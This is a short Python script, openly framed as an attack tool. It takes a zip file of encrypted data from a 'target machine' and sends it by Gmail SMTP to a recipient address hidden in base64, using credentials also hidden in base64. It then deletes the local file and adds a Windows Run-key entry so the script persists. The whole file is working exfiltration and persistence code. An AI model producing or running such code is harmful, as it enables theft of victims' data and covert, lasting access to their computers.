import smtplib
from email.message import EmailMessage
import os
import base64
import winreg

def b(s):
    return base64.b64decode(s).decode()

def obfuscated_send_email_with_attachment(
    a, b, c, d, e, f, g, h, i
):
    if not os.path.exists(e):
        print(f"Error: File '{e}' not found.")
        return

    j = EmailMessage()
    j['From'] = a
    j['To'] = b
    j['Subject'] = c
    j.set_content(d)

    with open(e, 'rb') as k:
        l = k.read()
        m = os.path.basename(e)

    j.add_attachment(l, maintype='application', subtype='octet-stream', filename=m)

    try:
        with smtplib.SMTP(f, g) as n:
            n.starttls()
            n.login(h, i)
            n.send_message(j)
            print(f"Email sent to {b} with attachment '{m}'.")
    except Exception as p:
        print("Error sending email:", p)

    os.remove(e)
    print(f"Encrypted file '{m}' deleted after exfiltration.")

def add_persistence():
    reg_key = winreg.HKEY_CURRENT_USER
    reg_subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_value_name = "MyScript"
    reg_value = os.path.abspath(__file__)

    with winreg.OpenKey(reg_key, reg_subkey, 0, winreg.KEY_WRITE) as reg_handle:
        winreg.SetValueEx(reg_handle, reg_value_name, 0, winreg.REG_SZ, reg_value)
    print("Persistence mechanism added.")

if __name__ == "__main__":
    obfuscated_send_email_with_attachment(
        a=b('bm5xcTk2Mjk5QGdtYWlsLmNvbQ=='),
        b=b('cmVjZWl2ZXJjZTc3QGdtYWlsLmNvbQ=='),
        c="Exfiltrated Encrypted File",
        d="This is the encrypted zip file sent from the target machine.",
        e=b('YzpcVXNlcnNcVGVzdCAxXERlc3ktd29ya2luZyBjaGFsbGVuZ2U=\n') + r"/encrypted_files.zip",
        f="smtp.gmail.com",
        g=587,
        h=b('bm5xcTk2Mjk5QGdtYWlsLmNvbQ=='),
        i=b('cGFzc3dvcmQ='),
    )
    add_persistence()
